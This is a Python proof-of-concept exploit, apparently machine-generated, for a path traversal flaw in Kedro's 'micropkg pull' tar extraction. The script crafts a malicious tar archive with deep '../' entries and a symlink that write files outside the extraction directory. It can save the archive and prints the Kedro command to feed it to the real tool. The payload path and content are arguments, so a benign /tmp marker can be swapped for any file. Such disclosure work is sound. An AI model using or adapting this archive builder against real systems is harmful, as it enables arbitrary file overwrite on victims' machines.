#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: afo-000
# Sink: _unpack_sdist
# Auto-generated — run with: python3 afo_cli_argument_pyproject__unpack_sdist.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Kedro micropkg pull path traversal vulnerability.

Vulnerability: Arbitrary File Overwrite (AFO) via path traversal in tar archive extraction.
The `safe_extract` function in Kedro's utils does not prevent `../` sequences in tar entry paths.
An attacker can supply a malicious tar archive that, when extracted, overwrites files outside
the intended destination directory.

This PoC demonstrates the vulnerability by creating a malicious tar archive that writes a
benign marker file to /tmp/poc_success.txt, proving arbitrary file write capability.
"""

import io
import os
import tarfile
import tempfile
import shutil
import sys
import argparse
from pathlib import Path

# Configuration - modify these as needed
DEFAULT_TARGET_DIR = "/tmp/kedro_poc_target"  # Where Kedro would extract the archive
DEFAULT_PAYLOAD_FILE = "/tmp/poc_success.txt"  # Benign file to create as proof
DEFAULT_PAYLOAD_CONTENT = "Kedro path traversal PoC successful!\n"


def create_malicious_tar(payload_path: str, payload_content: str) -> bytes:
    """
    Create a malicious tar archive with path traversal entries.
    
    The archive contains a single entry that uses '../' to escape the extraction
    directory and write to an arbitrary location.
    
    Args:
        payload_path: Absolute path where the payload should be written
        payload_content: Content to write to the payload file
    
    Returns:
        Bytes of the malicious tar archive
    """
    # Create a tar archive in memory
    buf = io.BytesIO()
    
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        # Create a directory entry that traverses up to root
        # The extraction target is typically something like /tmp/kedro_poc_target/
        # We need to go up enough directories to reach /
        # For a typical extraction to /tmp/kedro_poc_target/, we need ../../
        # But to be safe and demonstrate the vulnerability clearly, we'll use
        # multiple levels of traversal
        
        # First, create a normal-looking package directory
        pkg_dir = "my_package/"
        pkg_info = tarfile.TarInfo(name=pkg_dir)
        pkg_info.type = tarfile.DIRTYPE
        pkg_info.mode = 0o755
        tar.addfile(pkg_info)
        
        # Create a normal __init__.py in the package
        init_info = tarfile.TarInfo(name=f"{pkg_dir}__init__.py")
        init_info.size = 0
        init_info.mode = 0o644
        tar.addfile(init_info)
        
        # Now create the malicious entry with path traversal
        # We need to traverse from the extraction directory to the target
        # The extraction directory is typically a temp directory or project directory
        # We'll use enough ../ to reach root, then go to the target
        
        # Calculate traversal depth: from extraction dir to root
        # If extraction is to /tmp/kedro_poc_target/, we need ../../
        # But to be robust, we'll use a deep traversal
        traversal = "../" * 10  # Go up 10 levels (more than enough to reach /)
        
        # Construct the malicious entry path
        malicious_path = f"{traversal}{payload_path.lstrip('/')}"
        
        # Create the tar entry
        tar_info = tarfile.TarInfo(name=malicious_path)
        tar_info.size = len(payload_content)
        tar_info.mode = 0o644
        tar_info.type = tarfile.REGTYPE
        
        # Add the file content
        tar.addfile(tar_info, io.BytesIO(payload_content.encode()))
        
        # Also add a symlink to demonstrate the vulnerability further
        # (though the finding says symlinks are checked, we include it for completeness)
        symlink_path = f"{traversal}tmp/kedro_poc_symlink"
        symlink_info = tarfile.TarInfo(name=symlink_path)
        symlink_info.type = tarfile.SYMTYPE
        symlink_info.linkname = payload_path
        tar.addfile(symlink_info)
    
    buf.seek(0)
    return buf.getvalue()


def simulate_extraction(tar_bytes: bytes, target_dir: str) -> None:
    """
    Simulate what Kedro's safe_extract does with the malicious tar archive.
    
    This demonstrates that safe_extract does NOT prevent path traversal.
    
    Args:
        tar_bytes: The malicious tar archive bytes
        target_dir: Directory where extraction would occur
    """
    # Create the target directory
    os.makedirs(target_dir, exist_ok=True)
    
    print(f"[*] Simulating extraction to: {target_dir}")
    print(f"[*] Target payload file: {DEFAULT_PAYLOAD_FILE}")
    
    # This is what Kedro's safe_extract does (simplified)
    # Note: safe_extract only checks for absolute paths and symlinks,
    # but does NOT check for '../' sequences
    with tarfile.open(fileobj=io.BytesIO(tar_bytes), mode="r:gz") as tar:
        print(f"[*] Archive contents:")
        for member in tar.getmembers():
            print(f"    - {member.name} (type: {'dir' if member.isdir() else 'file' if member.isfile() else 'symlink'})")
        
        print(f"\n[*] Extracting archive...")
        # This is the vulnerable call - no path traversal protection
        tar.extractall(path=target_dir)
    
    print(f"[*] Extraction complete!")
    
    # Check if the payload file was created
    if os.path.exists(DEFAULT_PAYLOAD_FILE):
        print(f"[+] SUCCESS: Payload file created at {DEFAULT_PAYLOAD_FILE}")
        with open(DEFAULT_PAYLOAD_FILE, 'r') as f:
            print(f"[+] Content: {f.read().strip()}")
    else:
        print(f"[-] Payload file not found at {DEFAULT_PAYLOAD_FILE}")
        print(f"[*] Checking extraction directory contents:")
        for root, dirs, files in os.walk(target_dir):
            for f in files:
                print(f"    {os.path.join(root, f)}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for Kedro micropkg pull path traversal vulnerability"
    )
    parser.add_argument(
        "--target-dir",
        default=DEFAULT_TARGET_DIR,
        help=f"Directory to simulate extraction into (default: {DEFAULT_TARGET_DIR})"
    )
    parser.add_argument(
        "--payload-path",
        default=DEFAULT_PAYLOAD_FILE,
        help=f"Path for the benign payload file (default: {DEFAULT_PAYLOAD_FILE})"
    )
    parser.add_argument(
        "--payload-content",
        default=DEFAULT_PAYLOAD_CONTENT,
        help=f"Content for the payload file (default: '{DEFAULT_PAYLOAD_CONTENT.strip()}')"
    )
    parser.add_argument(
        "--save-archive",
        help="Save the malicious tar archive to this file for testing with actual Kedro"
    )
    
    args = parser.parse_args()
    
    print("[*] Kedro micropkg pull Path Traversal PoC")
    print("[*] =======================================")
    print()
    
    # Create the malicious tar archive
    print("[*] Creating malicious tar archive...")
    tar_bytes = create_malicious_tar(args.payload_path, args.payload_content)
    print(f"[*] Created tar archive ({len(tar_bytes)} bytes)")
    
    # Optionally save the archive for testing with actual Kedro
    if args.save_archive:
        with open(args.save_archive, 'wb') as f:
            f.write(tar_bytes)
        print(f"[*] Saved malicious archive to: {args.save_archive}")
        print(f"[*] To test with actual Kedro, run:")
        print(f"    kedro micropkg pull file://{os.path.abspath(args.save_archive)}")
        print()
    
    # Simulate the extraction
    print("[*] Simulating vulnerable extraction...")
    print()
    
    # Clean up any previous payload
    if os.path.exists(args.payload_path):
        os.remove(args.payload_path)
    
    try:
        simulate_extraction(tar_bytes, args.target_dir)
    except Exception as e:
        print(f"[-] Error during extraction: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Clean up the extraction directory
        if os.path.exists(args.target_dir):
            shutil.rmtree(args.target_dir)
            print(f"[*] Cleaned up extraction directory: {args.target_dir}")
        
        # Clean up the payload file if it was created
        if os.path.exists(args.payload_path):
            os.remove(args.payload_path)
            print(f"[*] Cleaned up payload file: {args.payload_path}")


if __name__ == "__main__":
    main()
